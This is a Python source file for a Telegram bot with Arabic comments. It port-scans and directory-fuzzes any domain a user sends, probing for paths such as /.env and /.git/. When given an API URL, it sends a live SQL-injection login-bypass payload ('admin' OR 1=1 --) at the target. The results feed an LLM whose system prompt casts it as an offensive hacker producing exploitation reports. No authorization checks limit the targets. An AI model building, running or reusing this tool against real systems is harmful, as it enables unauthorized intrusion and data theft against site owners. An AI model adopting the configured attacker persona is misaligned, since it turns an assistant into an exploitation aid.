import os, logging, asyncio, socket, re, requests
from telegram import Update
from telegram.constants import ChatAction, ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from groq import Groq

# --- [ إعدادات النظام العيا ] ---
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "").strip()
GROQ_API_KEY = os.getenv("GROQ_API_KEY", "").strip()

client = Groq(api_key=GROQ_API_KEY)
user_conversations = {}

# --- [ وحدة الاستطلاع - ProScanner ] ---

class ProScanner:
    @staticmethod
    async def scan_target(domain):
        report = {"ip": "Unknown", "ports": [], "headers": {}, "waf": "Not Detected"}
        try:
            report["ip"] = socket.gethostbyname(domain)
            for port in [80, 443, 21, 22, 3306]:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.7)
                if sock.connect_ex((report["ip"], port)) == 0:
                    report["ports"].append(port)
                sock.close()

            url = f"https://{domain}" if 443 in report["ports"] else f"http://{domain}"
            res = requests.get(url, timeout=5, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
            report["headers"] = dict(res.headers)
            server = str(report["headers"].get("Server", "")).lower()
            if "cloudflare" in server: report["waf"] = "Cloudflare"
        except: pass
        return report

# --- [ وحدة التخمين - DirectoryFuzzer ] ---

class DirectoryFuzzer:
    @staticmethod
    async def fuzz(domain):
        wordlist = ['/.env', '/_nuxt/', '/api/v1', '/admin', '/robots.txt', '/.git/']
        found = []
        base_url = f"https://{domain}" if not domain.startswith('http') else domain
        async def check(path):
            try:
                r = requests.head(f"{base_url.rstrip('/')}{path}", timeout=2, verify=False)
                if r.status_code in [200, 403, 301]: return f"🚩 {path} ({r.status_code})"
            except: pass
            return None
        results = await asyncio.gather(*[check(p) for p in wordlist])
        return [r for r in results if r]

# --- [ وحدة اختراق الـ API - APIExploiter ] ---

class APIExploiter:
    @staticmethod
    async def attack_api(api_url):
        """محاولة حقن بيانات JSON لتخطي المصادقة"""
        # بايلود "Master Zen" الخاص بحقن SQL في الـ API
        payload = {
            "email": "admin' OR 1=1 --",
            "password": "ZenPassword123",
            "locale": "ar"
        }
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) CyberZen/2.0',
            'Accept': 'application/json'
        }
        try:
            # إرسال طلب POST حقيقي (الضربة الفعلية)
            response = requests.post(api_url, json=payload, headers=headers, timeout=7, verify=False)
            result = f"📡 **API Injection Result:**\n"
            result += f"🔹 Status: `{response.status_code}`\n"
            result += f"🔹 Server: `{response.headers.get('Server', 'Hidden')}`\n"
            result += f"🔹 Raw Response: `{response.text[:150]}...`"
            return result
        except Exception as e:
            return f"🛑 **API Attack Failed:** {str(e)}"

# --- [ المعالج الرئيسي - handle_message ] ---

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text
    user_id = update.message.from_user.id
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)

    # كشف الروابط (دومين أو API كامل)
    api_match = re.search(r'https?://[^\s]+api[^\s]+', user_text)
    domain_match = re.search(r'(?:https?://)?(?:www\.)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', user_text)

    intelligence_report = ""

    if api_match:
        # استهداف الـ API مباشرة
        target_api = api_match.group(0)
        intelligence_report = await APIExploiter.attack_api(target_api)
    elif domain_match:
        # استطلاع دومين عادي
        target = domain_match.group(1)
        data = await ProScanner.scan_target(target)
        fuzz = await DirectoryFuzzer.fuzz(target)
        intelligence_report = (
            f"🔍 **Target Recon:**\n🌐 IP: `{data['ip']}`\n🔌 Ports: `{data['ports']}`\n🛡️ WAF: `{data['waf']}`\n\n"
            f"📂 **Fuzzing:**\n{chr(10).join(fuzz) if fuzz else 'Clean.'}"
        )

    system_prompt = "أنت Master Zen خبير سيبراني هجومي بـ 100 عام من الخبرة. حلل البيانات التقنية وقدم تقريراً عسكرياً لاستغلال الثغرات."
    
    if user_id not in user_conversations: user_conversations[user_id] = []
    messages = [{"role": "system", "content": f"{system_prompt}\n\n{intelligence_report}"}, {"role": "user", "content": user_text}]

    try:
        completion = client.chat.completions.create(messages=messages, model="llama-3.3-70b-versatile", temperature=0.1)
        response = completion.choices[0].message.content
        try:
            await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)
        except:
            await update.message.reply_text(response)
    except Exception as e:
        await update.message.reply_text(f"🛑 Error: {e}")

if __name__ == '__main__':
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    application.run_polling()
